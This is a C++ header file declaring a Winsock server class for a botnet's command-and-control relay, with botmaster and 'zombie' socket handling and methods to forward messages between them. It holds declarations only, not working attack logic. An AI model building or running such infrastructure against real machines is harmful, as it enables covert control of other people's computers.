#pragma once

#include <WS2tcpip.h>
#pragma comment (lib, "ws2_32.lib")

#include <iostream>
#include <string>
#include <vector>

#define WEIRDO	  0
#define BOTMASTER 1
#define ZOMBIE	  2

#define BOTMASTERDISCONNECT 3
#define BOTMDISCONNECT 4

class Server
{
public:
	Server(const char* ip, int port);
	~Server();

	bool init();
	int cleanUp();

	void waiting();

	bool createListeningSocket();
	int acceptConnection();

	void sendToZombies(const char* msg, int size);
	bool sendToZombie(SOCKET zombie, const char* msg, int size);
	bool sendToBotmaster(const char* msg, int size);

	bool receive();
	const char* getBotMasterMessage();
	std::vector<const char*> getBotMessages();

	bool clientDisconnect();
	void closeConnections();
private:
	std::string m_IpAddress;
	int m_Port;

	SOCKET m_Listening = INVALID_SOCKET;
	SOCKET m_Botmaster = INVALID_SOCKET;

	std::vector<SOCKET> m_Zombies;

	bool m_BotMasterDisconnect = false;
	char m_BotMasterBuf[4096];

	std::vector<int> m_ZombieDisconnects;
	std::vector<std::pair<SOCKET, const char*>> m_ZombieBufs;

	//set of socket descriptors for select() 
	fd_set m_Readfds;
	SOCKET m_RdySocket;
};